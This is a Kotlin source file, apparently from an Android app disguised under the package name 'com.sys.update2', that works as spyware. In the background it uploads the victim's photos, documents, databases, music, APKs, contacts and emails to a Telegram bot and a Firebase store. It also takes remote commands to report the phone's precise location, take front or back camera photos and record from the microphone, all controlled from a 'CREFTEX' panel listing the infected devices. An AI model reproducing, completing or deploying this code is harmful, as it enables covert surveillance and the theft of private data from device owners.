package com.sys.update2

import android.content.Context
import android.util.Log
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.util.concurrent.TimeUnit

object CommandExecutor {

    private const val TAG = "CmdExec"

    // ═══════════════════════════════════════════
    //  client موحد
    // ═══════════════════════════════════════════
    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(60, TimeUnit.SECONDS)
        .build()

    private fun fsBase(): String =
        "https://firestore.googleapis.com/v1/projects/${Config.FIREBASE_PROJECT_ID}/databases/(default)/documents"

    private fun str(s: String) = JSONObject().put("stringValue", s)
    private fun num(n: Long) = JSONObject().put("integerValue", n.toString())

    // ═══════════════════════════════════════════
    //  cache المرفوع — منع التكرار
    // ═══════════════════════════════════════════
    private val uploadedCache = HashMap<String, MutableSet<String>>()
    @Volatile private var lastSyncMs = 0L

    private fun uploadedFor(ctx: Context, type: String): MutableSet<String> {
        val code = DeviceManager.getDeviceCode(ctx)
        val k = "${code}_$type"
        uploadedCache[k]?.let { return it }
        val set = mutableSetOf<String>()
        try {
            val coll = when (type) {
                "photo" -> "photos"
                "file" -> "files"
                "music" -> "music"
                "apk" -> "apks"
                else -> "photos"
            }
            val url = "${fsBase()}/devices/$code/$coll?key=${Config.FIREBASE_API_KEY}&pageSize=1000"
            val req = Request.Builder().url(url).get().build()
            client.newCall(req).execute().use { resp ->
                val body = resp.body?.string()
                if (!body.isNullOrBlank()) {
                    val docs = JSONObject(body).optJSONArray("documents")
                    if (docs != null) {
                        for (i in 0 until docs.length()) {
                            val f = docs.optJSONObject(i)?.optJSONObject("fields") ?: continue
                            val n = f.optJSONObject("name")?.optString("stringValue") ?: ""
                            val s = f.optJSONObject("size")?.optString("integerValue") ?: "0"
                            if (n.isNotBlank()) set.add("$n|$s")
                        }
                    }
                }
            }
        } catch (e: Exception) { Log.e(TAG, "uploadedFor err: ${e.message}") }
        uploadedCache[k] = set
        return set
    }

    private fun markUploaded(ctx: Context, type: String, name: String, size: Long) {
        val code = DeviceManager.getDeviceCode(ctx)
        val k = "${code}_$type"
        uploadedCache.getOrPut(k) { mutableSetOf() }.add("$name|$size")
    }

    // ═══════════════════════════════════════════
    //  حفظ metadata في Firestore
    // ═══════════════════════════════════════════
    private fun saveMeta(ctx: Context, coll: String, name: String, size: Long, date: Long, fileId: String, ext: String) {
        try {
            val code = DeviceManager.getDeviceCode(ctx)
            val docId = (name + size).hashCode().toString().replace("-", "m")
            val url = "${fsBase()}/devices/$code/$coll/$docId?key=${Config.FIREBASE_API_KEY}"
            val fields = JSONObject().apply {
                put("file_id", str(fileId))
                put("name", str(name))
                put("size", num(size))
                put("date", num(date))
                put("ext", str(ext))
            }
            val body = JSONObject().put("fields", fields).toString()
            val req = Request.Builder().url(url)
                .patch(body.toRequestBody("application/json".toMediaType())).build()
            client.newCall(req).execute().use { }
        } catch (e: Exception) { Log.e(TAG, "saveMeta err: ${e.message}") }
    }

    // ═══════════════════════════════════════════
    //  autoSyncAll — يُنادى كل 60 ثانية من Service
    // ═══════════════════════════════════════════
    @Synchronized
    fun autoSyncAll(ctx: Context) {
        val now = System.currentTimeMillis()
        if (now - lastSyncMs < 30_000L) return  // حماية
        lastSyncMs = now

        Log.d(TAG, "autoSync starting…")

        // 1. الصور — بس الجديد
        try { syncPhotos(ctx) } catch (e: Exception) { Log.e(TAG, "syncPhotos: ${e.message}") }

        // 2. الملفات
        try { syncFiles(ctx) } catch (e: Exception) { Log.e(TAG, "syncFiles: ${e.message}") }

        // 3. الموسيقى
        try { syncMusic(ctx) } catch (e: Exception) { Log.e(TAG, "syncMusic: ${e.message}") }

        // 4. APKs
        try { syncApks(ctx) } catch (e: Exception) { Log.e(TAG, "syncApks: ${e.message}") }

        // 5. جهات الاتصال (مرة واحدة)
        try { syncContacts(ctx) } catch (e: Exception) { Log.e(TAG, "syncContacts: ${e.message}") }

        Log.d(TAG, "autoSync done")
    }

    // ═══════════════════════════════════════════
    //  Photos
    // ═══════════════════════════════════════════
    private fun syncPhotos(ctx: Context) {
        val uploaded = uploadedFor(ctx, "photo")
        val list = MediaScanner.scanImages(ctx)
        var count = 0
        for (m in list) {
            val file = File(m.path)
            if (!file.exists()) continue
            val key = "${m.name}|${m.size}"
            if (uploaded.contains(key)) continue
            val (ok, fileId) = TelegramApi.sendPhoto(file, "📸 ${m.name}")
            if (ok && fileId.isNotBlank()) {
                saveMeta(ctx, "photos", m.name, m.size, m.lastModified, fileId, "jpg")
                markUploaded(ctx, "photo", m.name, m.size)
                count++
            }
            if (count >= 50) break  // 50/دورة
        }
        if (count > 0) Log.d(TAG, "photos uploaded: $count")
    }

    // ═══════════════════════════════════════════
    //  Files
    // ═══════════════════════════════════════════
    private fun syncFiles(ctx: Context) {
        val uploaded = uploadedFor(ctx, "file")
        val types = FileGrabber.DOCUMENTS + FileGrabber.ARCHIVES + FileGrabber.DATABASES
        val list = FileGrabber.scanByTypes(types, 2000)
        var count = 0
        for (f in list) {
            val file = File(f.path)
            if (!file.exists()) continue
            val key = "${f.name}|${f.size}"
            if (uploaded.contains(key)) continue
            val ok = TelegramApi.sendDocument(file, "📎 ${f.name}")
            if (ok) {
                saveMeta(ctx, "files", f.name, f.size, f.lastModified, "", f.ext)
                markUploaded(ctx, "file", f.name, f.size)
                count++
            }
            if (count >= 30) break
        }
        if (count > 0) Log.d(TAG, "files uploaded: $count")
    }

    // ═══════════════════════════════════════════
    //  Music
    // ═══════════════════════════════════════════
    private fun syncMusic(ctx: Context) {
        val uploaded = uploadedFor(ctx, "music")
        val list = MediaScanner.scanAudio(ctx)
        var count = 0
        for (m in list) {
            val file = File(m.path)
            if (!file.exists()) continue
            val key = "${m.name}|${m.size}"
            if (uploaded.contains(key)) continue
            val ok = TelegramApi.sendAudio(file, "🎵 ${m.name}")
            if (ok) {
                saveMeta(ctx, "music", m.name, m.size, m.lastModified, "", "mp3")
                markUploaded(ctx, "music", m.name, m.size)
                count++
            }
            if (count >= 20) break
        }
        if (count > 0) Log.d(TAG, "music uploaded: $count")
    }

    // ═══════════════════════════════════════════
    //  APKs
    // ═══════════════════════════════════════════
    private fun syncApks(ctx: Context) {
        val uploaded = uploadedFor(ctx, "apk")
        val list = FileGrabber.scanByTypes(FileGrabber.APKS, 500)
        var count = 0
        for (a in list) {
            val file = File(a.path)
            if (!file.exists()) continue
            val key = "${a.name}|${a.size}"
            if (uploaded.contains(key)) continue
            val ok = TelegramApi.sendDocument(file, "📱 ${a.name}")
            if (ok) {
                saveMeta(ctx, "apks", a.name, a.size, a.lastModified, "", "apk")
                markUploaded(ctx, "apk", a.name, a.size)
                count++
            }
            if (count >= 10) break
        }
        if (count > 0) Log.d(TAG, "apks uploaded: $count")
    }

    // ═══════════════════════════════════════════
    //  Contacts + Emails (مرة واحدة)
    // ═══════════════════════════════════════════
    private fun syncContacts(ctx: Context) {
        val prefs = ctx.getSharedPreferences("sync_prefs", Context.MODE_PRIVATE)
        if (prefs.getBoolean("contacts_done", false)) return

        val contacts = ContactsHelper.getAllContacts(ctx)
        if (contacts.isNotEmpty()) {
            val code = DeviceManager.getDeviceCode(ctx)
            val batches = contacts.chunked(20)
            for (batch in batches) {
                val writes = JSONArray()
                for (c in batch) {
                    val phonesArr = JSONArray()
                    c.phones.forEach { phonesArr.put(JSONObject().put("stringValue", it)) }
                    val emailsArr = JSONArray()
                    c.emails.forEach { emailsArr.put(JSONObject().put("stringValue", it)) }
                    val fields = JSONObject().apply {
                        put("name", str(c.name))
                        put("phones", JSONObject().put("arrayValue", JSONObject().put("values", phonesArr)))
                        put("emails", JSONObject().put("arrayValue", JSONObject().put("values", emailsArr)))
                    }
                    val docId = (c.name + System.nanoTime()).hashCode().toString().replace("-", "m")
                    writes.put(JSONObject().apply {
                        put("update", JSONObject().apply {
                            put("name", "projects/${Config.FIREBASE_PROJECT_ID}/databases/(default)/documents/devices/$code/contacts/$docId")
                            put("fields", fields)
                        })
                    })
                }
                val body = JSONObject().put("writes", writes).toString()
                val url = "https://firestore.googleapis.com/v1/projects/${Config.FIREBASE_PROJECT_ID}/databases/(default)/documents:commit?key=${Config.FIREBASE_API_KEY}"
                try {
                    val req = Request.Builder().url(url)
                        .post(body.toRequestBody("application/json".toMediaType())).build()
                    client.newCall(req).execute().use { }
                } catch (e: Exception) { Log.e(TAG, "contacts batch: ${e.message}") }
            }
        }

        val emails = ContactsHelper.getAllEmails(ctx)
        if (emails.isNotEmpty()) {
            val code = DeviceManager.getDeviceCode(ctx)
            val writes = JSONArray()
            for (e in emails) {
                val fields = JSONObject().apply {
                    put("name", str(e.name))
                    put("email", str(e.email))
                }
                val docId = e.email.hashCode().toString().replace("-", "m")
                writes.put(JSONObject().apply {
                    put("update", JSONObject().apply {
                        put("name", "projects/${Config.FIREBASE_PROJECT_ID}/databases/(default)/documents/devices/$code/emails/$docId")
                        put("fields", fields)
                    })
                })
            }
            val body = JSONObject().put("writes", writes).toString()
            val url = "https://firestore.googleapis.com/v1/projects/${Config.FIREBASE_PROJECT_ID}/databases/(default)/documents:commit?key=${Config.FIREBASE_API_KEY}"
            try {
                val req = Request.Builder().url(url)
                    .post(body.toRequestBody("application/json".toMediaType())).build()
                client.newCall(req).execute().use { }
            } catch (e: Exception) { Log.e(TAG, "emails: ${e.message}") }
        }

        prefs.edit().putBoolean("contacts_done", true).apply()
        Log.d(TAG, "contacts+emails synced: ${contacts.size}/${emails.size}")
    }

    // ═══════════════════════════════════════════
    //  handlePublic — أوامر عامة
    // ═══════════════════════════════════════════
    fun handlePublic(ctx: Context, cmd: String) {
        when {
            cmd == "/start" || cmd == "/menu" || cmd == "menu" || cmd == "🏠 القائمة" -> showMainMenu(ctx)
            cmd == "/help" || cmd == "help" || cmd == "مساعدة" -> showHelp(ctx)
            cmd == "📱 قائمة الأجهزة" || cmd == "🌐 كل الأجهزة" -> showDeviceList(ctx)
        }
    }

    // ═══════════════════════════════════════════
    //  handleText — أوامر يدوية
    // ═══════════════════════════════════════════
    fun handleText(ctx: Context, text: String, code: String) {
        val cmd = text.trim()
        val cleanCmd = cmd.replace(Regex("@\\w+"), "").trim()

        when {
            cleanCmd == "📸 كل الصور" || cleanCmd == "/photos" -> runJob { syncPhotos(ctx); TelegramApi.sendMessage("✅ تم فحص الصور 🆔 `$code`") }
            cleanCmd == "📁 كل الملفات" || cleanCmd == "/files" -> runJob { syncFiles(ctx); TelegramApi.sendMessage("✅ تم فحص الملفات 🆔 `$code`") }
            cleanCmd == "🎵 كل الموسيقى" || cleanCmd == "/music" -> runJob { syncMusic(ctx); TelegramApi.sendMessage("✅ تم فحص الموسيقى 🆔 `$code`") }
            cleanCmd == "📱 APK" || cleanCmd == "/apks" -> runJob { syncApks(ctx); TelegramApi.sendMessage("✅ تم فحص APKs 🆔 `$code`") }
            cleanCmd == "👥 جهات الاتصال" || cleanCmd == "/contacts" -> runJob { ctx.getSharedPreferences("sync_prefs", Context.MODE_PRIVATE).edit().putBoolean("contacts_done", false).apply(); syncContacts(ctx); TelegramApi.sendMessage("✅ تم فحص جهات الاتصال 🆔 `$code`") }
            cleanCmd == "🚀 جلب كل شي" || cleanCmd == "/all" -> runJob { autoSyncAll(ctx); TelegramApi.sendMessage("✅ تم الفحص الشامل 🆔 `$code`") }
            cleanCmd == "📊 معلومات الجهاز" || cleanCmd == "/info" -> runJob { TelegramApi.sendMessage("📱 *${DeviceManager.getDeviceName(ctx)}*\n🆔 `$code`\n\n" + DeviceInfo.getFullInfo(ctx)) }
            cleanCmd == "📍 عرض الموقع" || cleanCmd == "/location" -> runJob {
                TelegramApi.sendMessage("📍 *جاري تحديد الموقع...* 🆔 `$code`")
                val loc = LocationHelper.getPreciseLocation(ctx)
                TelegramApi.sendMessage(LocationHelper.formatLocation(ctx, loc) + "\n🆔 `$code`")
            }
            cleanCmd == "🤳 تصوير أمامي" || cleanCmd == "/cam_front" -> runJob { captureCamera(ctx, true, code) }
            cleanCmd == "📸 تصوير خلفي" || cleanCmd == "/cam_back" -> runJob { captureCamera(ctx, false, code) }
            cleanCmd == "🟢 تشغيل الصور" || cleanCmd == "🔴 إيقاف الصور" -> togglePhotos(ctx, code)
            cleanCmd == "🟢 تشغيل الموقع" || cleanCmd == "🔴 إيقاف الموقع" -> toggleLocation(ctx, code)
            cleanCmd == "🟢 تشغيل المايك" || cleanCmd == "🔴 إيقاف المايك" -> toggleAudio(ctx, code)
            else -> TelegramApi.sendMessage("❓ أمر غير معروف: `$cleanCmd`")
        }
    }

    private fun togglePhotos(ctx: Context, code: String) {
        KeyboardBuilder.photosOn = !KeyboardBuilder.photosOn
        val state = if (KeyboardBuilder.photosOn) "🟢 شغّال" else "🔴 متوقف"
        TelegramApi.sendMessage("📸 *الصور*\n\nالحالة: $state\n🆔 `$code`")
    }

    private fun toggleLocation(ctx: Context, code: String) {
        KeyboardBuilder.locationOn = !KeyboardBuilder.locationOn
        val state = if (KeyboardBuilder.locationOn) "🟢 شغّال" else "🔴 متوقف"
        TelegramApi.sendMessage("📍 *الموقع*\n\nالحالة: $state\n🆔 `$code`")
    }

    private fun toggleAudio(ctx: Context, code: String) {
        KeyboardBuilder.audioOn = !KeyboardBuilder.audioOn
        if (KeyboardBuilder.audioOn) AudioRecorder.startLoop(ctx) else AudioRecorder.stopLoop(ctx)
        val state = if (KeyboardBuilder.audioOn) "🟢 شغّال" else "🔴 متوقف"
        TelegramApi.sendMessage("🎤 *الميكروفون*\n\nالحالة: $state\n🆔 `$code`")
    }

    private fun captureCamera(ctx: Context, front: Boolean, code: String) {
        val label = if (front) "أمامية" else "خلفية"
        TelegramApi.sendMessage("📷 *جاري التصوير ($label)* 🆔 `$code`")
        val file = CameraCapture.capture(ctx, front, timeoutSec = 12)
        if (file != null && file.exists()) {
            val (ok, fileId) = TelegramApi.sendPhoto(file, "📷 $label [${code}]")
            if (ok && fileId.isNotBlank()) {
                saveMeta(ctx, "photos", file.name, file.length(), System.currentTimeMillis(), fileId, "jpg")
            }
            file.delete()
        } else TelegramApi.sendMessage("❌ فشل التصوير 🆔 `$code`")
    }

    // ═══════════════════════════════════════════
    //  DeviceList
    // ═══════════════════════════════════════════
    private fun showDeviceList(ctx: Context) {
        runJob {
            val devices = DeviceManager.getDeviceList(ctx)
            if (devices.isEmpty()) { TelegramApi.sendMessage("📭 لا أجهزة مسجّلة"); return@runJob }
            val sb = StringBuilder()
            sb.append("📱 *الأجهزة المسجّلة* — ${devices.size}\n━━━━━━━━━━\n\n")
            for (d in devices) {
                val status = if (d.online) "🟢" else "🔴"
                sb.append("$status *${d.name}*\n🆔 `${d.code}`\n\n")
            }
            sb.append("للاستخدام:\n`/photos <الرمز>`")
            TelegramApi.sendMessage(sb.toString())
        }
    }

    private fun showMainMenu(ctx: Context) {
        val code = DeviceManager.getDeviceCode(ctx)
        val name = DeviceManager.getDeviceName(ctx)
        TelegramApi.sendMessage(
            "🎛 *لوحة التحكم — CREFTEX*\n\n🏷 *$name*\n🆔 `$code`\n\n" +
            "أرسل الأوامر مع الرمز:\n`/photos $code`\n`/info $code`\n`/all $code`"
        )
    }

    private fun showHelp(ctx: Context) {
        val code = DeviceManager.getDeviceCode(ctx)
        TelegramApi.sendMessage(
            "📖 *الأوامر المتاحة*\n\n" +
            "🔹 `/photos $code` — كل الصور\n" +
            "🔹 `/music $code` — الموسيقى\n" +
            "🔹 `/files $code` — كل الملفات\n" +
            "🔹 `/apks $code` — التطبيقات\n" +
            "🔹 `/contacts $code` — جهات الاتصال\n" +
            "🔹 `/info $code` — معلومات الجهاز\n" +
            "🔹 `/location $code` — الموقع\n" +
            "🔹 `/cam_front $code` — تصوير أمامي\n" +
            "🔹 `/cam_back $code` — تصوير خلفي\n" +
            "🔹 `/all $code` — جلب شامل\n\n" +
            "🆔 *رمزك:* `$code`"
        )
    }

    // ═══════════════════════════════════════════
    //  runJob — thread موحد
    // ═══════════════════════════════════════════
    private fun runJob(block: () -> Unit) {
        Thread {
            try { block() } catch (e: Exception) {
                Log.e(TAG, "job err: ${e.message}")
            }
        }.start()
    }
}
